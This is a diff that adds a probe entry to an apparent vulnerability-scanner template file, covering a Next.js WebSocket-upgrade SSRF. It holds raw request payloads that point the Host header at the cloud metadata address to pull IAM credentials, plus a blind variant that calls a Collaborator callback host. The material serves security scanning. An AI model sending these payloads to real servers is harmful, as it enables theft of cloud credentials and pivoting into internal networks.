@@ -80,6 +80,34 @@
           "variables": {"path_override": true, "needs_baseline": true}
         }
       ]
+    },
+    "nextjs_websocket_upgrade_ssrf_2026": {
+      "description": "CVE-2026-44578 — self-hosted Next.js (Node.js server) SSRF via WebSocket upgrade handling. Remote unauthenticated attacker sends a crafted Upgrade: websocket request, causing the Next.js server to proxy the connection to arbitrary internal or external destinations. Effective for IMDS / internal-service / Collaborator pivot from the server's network position. Pre-auth.",
+      "tech_match": ["next.js", "nextjs", "vercel-self-hosted", "node.js"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "Upgrade: websocket\\r\\nConnection: upgrade\\r\\nHost: 169.254.169.254\\r\\nSec-WebSocket-Version: 13\\r\\nSec-WebSocket-Key: dGVzdGtleS0xMjM0NTY3OA==",
+          "description": "Craft a WebSocket upgrade with Host pointing at IMDS. On vulnerable Next.js the server proxies and IMDS response surfaces. Manual chain — operator constructs via send_raw_request with unsafe_headers=True so Host flows through.",
+          "matchers": [
+            {"type": "word", "words": ["ami-id", "iam/security-credentials", "AccessKeyId"], "condition": "or"},
+            {"type": "status", "status": [101, 200]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {"manual_chain": true, "needs_unsafe_headers": true}
+        },
+        {
+          "payload": "Upgrade: websocket\\r\\nConnection: upgrade\\r\\nHost: COLLABORATOR\\r\\nSec-WebSocket-Version: 13\\r\\nSec-WebSocket-Key: dGVzdGtleS0xMjM0NTY3OA==",
+          "description": "Collaborator canary variant — proxy hits Collaborator → blind SSRF confirmed via interaction polling.",
+          "matchers": [
+            {"type": "collaborator", "interaction_types": ["HTTP", "DNS"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {"manual_chain": true, "requires_collaborator": true, "needs_unsafe_headers": true}
+        }
+      ]
     }
   }
 }
